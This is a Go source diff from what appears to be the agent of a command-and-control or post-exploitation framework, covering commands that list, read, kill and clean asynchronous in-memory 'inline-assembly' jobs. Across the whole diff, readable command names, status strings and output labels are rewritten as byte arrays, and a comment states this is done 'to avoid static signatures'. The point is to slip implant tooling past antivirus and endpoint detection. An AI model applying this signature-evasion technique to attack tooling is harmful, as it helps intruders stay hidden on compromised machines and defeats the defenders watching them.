@@ -12,6 +12,44 @@ import (
 	"time"
 )
 
+// Inline assembly job command strings (constructed to avoid static signatures)
+var (
+	// Command names
+	iasCmdJobs      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73})                               // inline-assembly-jobs
+	iasCmdOutput    = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6f, 0x75, 0x74, 0x70, 0x75, 0x74})                   // inline-assembly-output
+	iasCmdKill      = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6b, 0x69, 0x6c, 0x6c})                               // inline-assembly-kill
+	iasCmdClean     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x63, 0x6c, 0x65, 0x61, 0x6e}) // inline-assembly-jobs-clean
+	iasCmdStats     = string([]byte{0x69, 0x6e, 0x6c, 0x69, 0x6e, 0x65, 0x2d, 0x61, 0x73, 0x73, 0x65, 0x6d, 0x62, 0x6c, 0x79, 0x2d, 0x6a, 0x6f, 0x62, 0x73, 0x2d, 0x73, 0x74, 0x61, 0x74, 0x73}) // inline-assembly-jobs-stats
+
+	// Status strings
+	iasStatusRunning   = string([]byte{0x72, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67})                         // running
+	iasStatusCompleted = string([]byte{0x63, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64})             // completed
+	iasStatusFailed    = string([]byte{0x66, 0x61, 0x69, 0x6c, 0x65, 0x64})                               // failed
+	iasStatusKilled    = string([]byte{0x6b, 0x69, 0x6c, 0x6c, 0x65, 0x64})                               // killed
+	iasStatusTimeout   = string([]byte{0x74, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74})                         // timeout
+
+	// Format components
+	iasFmtRunningPrefix  = string([]byte{0x72, 0x3a})             // r:
+	iasFmtDonePrefix     = string([]byte{0x64, 0x3a})             // d:
+	iasFmtDash           = string([]byte{0x2d})                   // -
+	iasFmtPipe           = string([]byte{0x7c})                   // |
+	iasFmtNewline        = string([]byte{0x0a})                   // \n
+	iasFmtEllipsis       = string([]byte{0x2e, 0x2e, 0x2e})       // ...
+	iasFmtColSep         = string([]byte{0x20, 0x7c, 0x20})       // " | "
+	iasFmtZero           = string([]byte{0x30})                   // 0
+	iasFmtOne            = string([]byte{0x31})                   // 1
+	iasFmtColon          = string([]byte{0x3a})                   // :
+
+	// Stats labels
+	iasStatsHeader    = string([]byte{0x53, 0x74, 0x61, 0x74, 0x73, 0x3a, 0x0a})                                                                 // Stats:\n
+	iasStatsTotalLbl  = string([]byte{0x54, 0x6f, 0x74, 0x61, 0x6c, 0x20, 0x4a, 0x6f, 0x62, 0x73, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20})           // Total Jobs:
+	iasStatsRunLbl    = string([]byte{0x52, 0x75, 0x6e, 0x6e, 0x69, 0x6e, 0x67, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Running:
+	iasStatsCompLbl   = string([]byte{0x43, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Completed:
+	iasStatsFailLbl   = string([]byte{0x46, 0x61, 0x69, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Failed:
+	iasStatsKillLbl   = string([]byte{0x4b, 0x69, 0x6c, 0x6c, 0x65, 0x64, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Killed:
+	iasStatsTimeLbl   = string([]byte{0x54, 0x69, 0x6d, 0x65, 0x6f, 0x75, 0x74, 0x3a, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20})           // Timeout:
+)
+
 // AssemblyJob represents an async assembly execution job
 type AssemblyJob struct {
 	ID              string
@@ -47,7 +85,7 @@ var assemblyJobManager = &AssemblyJobManager{
 type InlineAssemblyJobsCommand struct{}
 
 func (c *InlineAssemblyJobsCommand) Name() string {
-	return "inline-assembly-jobs"
+	return iasCmdJobs
 }
 
 func (c *InlineAssemblyJobsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -58,7 +96,7 @@ func (c *InlineAssemblyJobsCommand) Execute(ctx *CommandContext, args []string) 
 type InlineAssemblyOutputCommand struct{}
 
 func (c *InlineAssemblyOutputCommand) Name() string {
-	return "inline-assembly-output"
+	return iasCmdOutput
 }
 
 func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -106,23 +144,23 @@ func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string
 	// Format: job_id|status|truncated(0/1)|duration_or_running|buffer_bytes|output
 	var result strings.Builder
 
-	truncatedFlag := "0"
+	truncatedFlag := iasFmtZero
 	if truncated {
-		truncatedFlag = "1"
+		truncatedFlag = iasFmtOne
 	}
 
 	var durationStr string
-	if status == "running" {
+	if status == iasStatusRunning {
 		duration := time.Since(job.StartTime).Round(time.Second)
-		durationStr = fmt.Sprintf("r:%s:%d", duration, bufferSize)
+		durationStr = iasFmtRunningPrefix + duration.String() + iasFmtColon + fmt.Sprintf("%d", bufferSize)
 	} else if job.EndTime != nil {
 		duration := job.EndTime.Sub(job.StartTime).Round(time.Second)
-		durationStr = fmt.Sprintf("d:%s", duration)
+		durationStr = iasFmtDonePrefix + duration.String()
 	} else {
-		durationStr = "-"
+		durationStr = iasFmtDash
 	}
 
-	result.WriteString(fmt.Sprintf("%s|%s|%s|%s\n", job.ID, status, truncatedFlag, durationStr))
+	result.WriteString(job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtPipe + durationStr + iasFmtNewline)
 
 	// Add the actual output
 	if output == "" {
@@ -142,7 +180,7 @@ func (c *InlineAssemblyOutputCommand) Execute(ctx *CommandContext, args []string
 type InlineAssemblyKillCommand struct{}
 
 func (c *InlineAssemblyKillCommand) Name() string {
-	return "inline-assembly-kill"
+	return iasCmdKill
 }
 
 func (c *InlineAssemblyKillCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -184,14 +222,13 @@ func executeAssemblyJobsList() CommandResult {
 		// Truncate name if too long
 		name := job.Name
 		if len(name) > 19 {
-			name = name[:16] + "..."
+			name = name[:16] + iasFmtEllipsis
 		}
 
-		output.WriteString(fmt.Sprintf("%-24s | %-19s | %-11s | %-16s\n",
-			job.ID[:min(24, len(job.ID))],
-			name,
-			job.Status,
-			durationStr))
+		output.WriteString(fmt.Sprintf("%-24s", job.ID[:min(24, len(job.ID))]) + iasFmtColSep +
+			fmt.Sprintf("%-19s", name) + iasFmtColSep +
+			fmt.Sprintf("%-11s", job.Status) + iasFmtColSep +
+			fmt.Sprintf("%-16s", durationStr) + iasFmtNewline)
 		job.OutputMutex.Unlock()
 	}
 
@@ -230,16 +267,16 @@ func executeAssemblyGetOutput(jobID string) CommandResult {
 
 	// Compact output format - client expands
 	// Format: status_code|job_id|truncated(0/1)|output
-	truncatedFlag := "0"
+	truncatedFlag := iasFmtZero
 	if truncated {
-		truncatedFlag = "1"
+		truncatedFlag = iasFmtOne
 	}
 
 	if output == "" {
 		// S18 = no output yet
-		output = fmt.Sprintf("%s|%s|%s|%s|", Succ(S18), job.ID, status, truncatedFlag)
+		output = Succ(S18) + iasFmtPipe + job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtPipe
 	} else {
-		output = fmt.Sprintf("%s|%s|%s|%s\n%s", Succ(S5), job.ID, status, truncatedFlag, output)
+		output = Succ(S5) + iasFmtPipe + job.ID + iasFmtPipe + status + iasFmtPipe + truncatedFlag + iasFmtNewline + output
 	}
 
 	return CommandResult{
@@ -270,7 +307,7 @@ func executeAssemblyKillJob(jobID string) CommandResult {
 		}
 	}
 
-	if job.Status != "running" {
+	if job.Status != iasStatusRunning {
 		return CommandResult{
 			Output:   ErrCtx(E27, job.ID),
 			ExitCode: 1,
@@ -284,7 +321,7 @@ func executeAssemblyKillJob(jobID string) CommandResult {
 
 		// Mark as killed
 		assemblyJobManager.mu.Lock()
-		job.Status = "killed"
+		job.Status = iasStatusKilled
 		endTime := time.Now()
 		job.EndTime = &endTime
 		assemblyJobManager.mu.Unlock()
@@ -338,7 +375,7 @@ func (ajm *AssemblyJobManager) CleanupOldJobs(maxAge time.Duration) {
 
 	now := time.Now()
 	for id, job := range ajm.jobs {
-		if job.Status != "running" && job.EndTime != nil {
+		if job.Status != iasStatusRunning && job.EndTime != nil {
 			if now.Sub(*job.EndTime) > maxAge {
 				delete(ajm.jobs, id)
 			}
@@ -353,7 +390,7 @@ func (ajm *AssemblyJobManager) CleanupCompletedJobs() int {
 
 	cleaned := 0
 	for id, job := range ajm.jobs {
-		if job.Status != "running" {
+		if job.Status != iasStatusRunning {
 			delete(ajm.jobs, id)
 			cleaned++
 		}
@@ -366,7 +403,7 @@ func (ajm *AssemblyJobManager) CleanupCompletedJobs() int {
 type InlineAssemblyJobsCleanCommand struct{}
 
 func (c *InlineAssemblyJobsCleanCommand) Name() string {
-	return "inline-assembly-jobs-clean"
+	return iasCmdClean
 }
 
 func (c *InlineAssemblyJobsCleanCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -414,7 +451,7 @@ func executeAssemblyJobsCleanSpecific(jobID string) CommandResult {
 		}
 	}
 
-	if job.Status == "running" {
+	if job.Status == iasStatusRunning {
 		return CommandResult{
 			Output:   ErrCtx(E27, job.ID),
 			ExitCode: 1,
@@ -433,7 +470,7 @@ func executeAssemblyJobsCleanSpecific(jobID string) CommandResult {
 type InlineAssemblyJobsStatsCommand struct{}
 
 func (c *InlineAssemblyJobsStatsCommand) Name() string {
-	return "inline-assembly-jobs-stats"
+	return iasCmdStats
 }
 
 func (c *InlineAssemblyJobsStatsCommand) Execute(ctx *CommandContext, args []string) CommandResult {
@@ -463,27 +500,27 @@ func executeAssemblyJobsStats() CommandResult {
 
 	for _, job := range jobs {
 		switch job.Status {
-		case "running":
+		case iasStatusRunning:
 			stats.Running++
-		case "completed":
+		case iasStatusCompleted:
 			stats.Completed++
-		case "failed":
+		case iasStatusFailed:
 			stats.Failed++
-		case "killed":
+		case iasStatusKilled:
 			stats.Killed++
-		case "timeout":
+		case iasStatusTimeout:
 			stats.Timeout++
 		}
 	}
 
 	var output strings.Builder
-	output.WriteString("Stats:\n")
-	output.WriteString(fmt.Sprintf("Total Jobs:     %d\n", stats.Total))
-	output.WriteString(fmt.Sprintf("Running:        %d\n", stats.Running))
-	output.WriteString(fmt.Sprintf("Completed:      %d\n", stats.Completed))
-	output.WriteString(fmt.Sprintf("Failed:         %d\n", stats.Failed))
-	output.WriteString(fmt.Sprintf("Killed:         %d\n", stats.Killed))
-	output.WriteString(fmt.Sprintf("Timeout:        %d\n", stats.Timeout))
+	output.WriteString(iasStatsHeader)
+	output.WriteString(iasStatsTotalLbl + fmt.Sprintf("%d", stats.Total) + iasFmtNewline)
+	output.WriteString(iasStatsRunLbl + fmt.Sprintf("%d", stats.Running) + iasFmtNewline)
+	output.WriteString(iasStatsCompLbl + fmt.Sprintf("%d", stats.Completed) + iasFmtNewline)
+	output.WriteString(iasStatsFailLbl + fmt.Sprintf("%d", stats.Failed) + iasFmtNewline)
+	output.WriteString(iasStatsKillLbl + fmt.Sprintf("%d", stats.Killed) + iasFmtNewline)
+	output.WriteString(iasStatsTimeLbl + fmt.Sprintf("%d", stats.Timeout) + iasFmtNewline)
 
 	return CommandResult{
 		Output:   output.String(),
